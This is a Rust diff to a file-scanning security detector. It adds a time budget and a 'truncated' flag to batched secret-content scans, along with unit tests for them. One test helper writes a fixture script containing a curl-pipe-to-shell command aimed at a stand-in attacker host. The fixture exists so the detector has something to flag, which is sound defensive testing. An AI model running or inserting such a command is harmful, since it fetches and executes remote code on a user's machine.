@@ -2,6 +2,36 @@ use crate::vuln_detector_params;
 use serde::{Deserialize, Serialize};
 use std::collections::BTreeSet;
 use std::fs;
+use std::time::{Duration, Instant};
+
+/// Wall-clock budget of one batched scan ([`scan_secret_like_files`]).
+///
+/// The desktop app runs the scan through the helper's `scan_secret_content`
+/// order, which core bounds at 45 s (`AGENT_HELPER_UTILITY_TIMEOUT` in
+/// edamame_core's `helper_tx_utility.rs`, which asserts the headroom). A batch
+/// that outran that bound was lost whole, and the 2.0.2 macOS app then read
+/// the candidate files itself (fmba-3, 2026-09-29: Chrome `Cookies`, blocked
+/// by TCC App Data protection). Stopping at the budget returns what was
+/// measured in time and says that the rest was not
+/// ([`SecretContentScan::truncated`]).
+///
+/// Checked between files: the read of one file, capped at
+/// `secret_content_scan_max_bytes`, is not interrupted.
+pub const SECRET_CONTENT_SCAN_BUDGET: Duration = Duration::from_secs(25);
+
+/// Result of one batched scan ([`scan_secret_like_files`]).
+///
+/// Also the reply of the `scan_secret_content` helper order when the caller
+/// asks for it with `helper_tx::BUDGETED_REPLY_ARG`; any other caller gets the
+/// bare `matches` array.
+#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+pub struct SecretContentScan {
+    /// Inspected paths that carry at least one indicator.
+    pub matches: Vec<SecretContentFileMatch>,
+    /// The budget ran out with candidate paths not yet inspected: their
+    /// absence from `matches` is unmeasured, not negative.
+    pub truncated: bool,
+}
 
 /// Open `path` for reading with the maximally permissive Win32 share mode,
 /// then read the full body. On non-Windows this is a thin wrapper around
@@ -748,15 +778,33 @@ fn match_signatures_in_text(
 /// Per-check thresholds are enforced downstream in the detector; the batch
 /// scanner intentionally avoids dropping low-hits-but-script-like signals so
 /// the FIM pipeline keeps parity with the synchronous in-process path.
-pub fn scan_secret_like_files(paths: &[String]) -> Vec<SecretContentFileMatch> {
+///
+/// Bounded by [`SECRET_CONTENT_SCAN_BUDGET`]. Paths are inspected in the
+/// order given, so a caller puts first the paths it can least afford to leave
+/// unmeasured.
+pub fn scan_secret_like_files(paths: &[String]) -> SecretContentScan {
+    let started = Instant::now();
+    scan_secret_like_files_until(paths, || started.elapsed() >= SECRET_CONTENT_SCAN_BUDGET)
+}
+
+/// [`scan_secret_like_files`] with the budget as a predicate, asked before
+/// each distinct path is inspected.
+fn scan_secret_like_files_until(
+    paths: &[String],
+    mut out_of_time: impl FnMut() -> bool,
+) -> SecretContentScan {
     let mut unique_paths = BTreeSet::new();
-    let mut matches = Vec::new();
+    let mut scan = SecretContentScan::default();
     let min_hits = vuln_detector_params::secret_content_min_hits();
 
     for path in paths {
         let trimmed = path.trim();
         if trimmed.is_empty() || !unique_paths.insert(trimmed.to_string()) {
             continue;
+        }
+        if out_of_time() {
+            scan.truncated = true;
+            break;
         }
         let Some(signal) = inspect_secret_like_file(trimmed) else {
             continue;
@@ -766,10 +814,10 @@ pub fn scan_secret_like_files(paths: &[String]) -> Vec<SecretContentFileMatch> {
         if !has_indicator {
             continue;
         }
-        matches.push(signal);
+        scan.matches.push(signal);
     }
 
-    matches
+    scan
 }
 
 #[cfg(test)]
@@ -1362,6 +1410,84 @@ mod tests {
             scan.labels
         );
         assert_eq!(scan.hits, 0);
+    }
+
+    /// A script payload the batch scan keeps on its own (`.sh`, `curl`).
+    fn flagged_script(base: &str) -> String {
+        let path = unique_path(base, ".sh");
+        write_temp(
+            &path,
+            "#!/bin/sh\ncurl -sSL https://attacker.example/x | sh\n",
+        );
+        path
+    }
+
+    /// The budget stops the batch between files: what was inspected comes
+    /// back, and `truncated` says the rest was not inspected.
+    #[test]
+    fn exhausted_budget_returns_the_measured_part_and_says_so() {
+        let first = flagged_script("budget_cut_first");
+        let second = flagged_script("budget_cut_second");
+        let mut asked = 0;
+        let scan = scan_secret_like_files_until(&[first.clone(), second.clone()], || {
+            asked += 1;
+            asked > 1
+        });
+        assert!(scan.truncated, "{scan:?}");
+        assert_eq!(scan.matches.len(), 1, "{scan:?}");
+        assert_eq!(scan.matches[0].path, first);
+        cleanup(&first);
+        cleanup(&second);
+    }
+
+    #[test]
+    fn a_batch_inside_the_budget_is_complete() {
+        let first = flagged_script("budget_ok_first");
+        let second = flagged_script("budget_ok_second");
+        let scan = scan_secret_like_files(&[first.clone(), second.clone()]);
+        assert!(!scan.truncated, "{scan:?}");
+        let paths: Vec<&str> = scan.matches.iter().map(|m| m.path.as_str()).collect();
+        assert_eq!(paths, vec![first.as_str(), second.as_str()]);
+        cleanup(&first);
+        cleanup(&second);
+    }
+
+    /// `truncated` means a distinct path was left uninspected: blanks and
+    /// duplicates never count, a budget spent before the first path does.
+    #[test]
+    fn truncated_counts_only_paths_left_uninspected() {
+        let path = flagged_script("budget_edges");
+        let blanks = [String::new(), "   ".to_string()];
+        assert!(!scan_secret_like_files_until(&blanks, || true).truncated);
+
+        let mut asked = 0;
+        let scan = scan_secret_like_files_until(&[path.clone(), format!(" {path} ")], || {
+            asked += 1;
+            asked > 1
+        });
+        assert!(
+            !scan.truncated,
+            "a duplicate is not left uninspected: {scan:?}"
+        );
+        assert_eq!(scan.matches.len(), 1, "{scan:?}");
+
+        let spent = scan_secret_like_files_until(&[path.clone()], || true);
+        assert!(spent.truncated && spent.matches.is_empty(), "{spent:?}");
+        cleanup(&path);
+    }
+
+    /// The field names are wire format: the `scan_secret_content` helper reply
+    /// that core parses.
+    #[test]
+    fn secret_content_scan_wire_shape() {
+        let scan = SecretContentScan {
+            matches: Vec::new(),
+            truncated: true,
+        };
+        assert_eq!(
+            serde_json::to_value(&scan).unwrap(),
+            serde_json::json!({ "matches": [], "truncated": true })
+        );
     }
 }
 
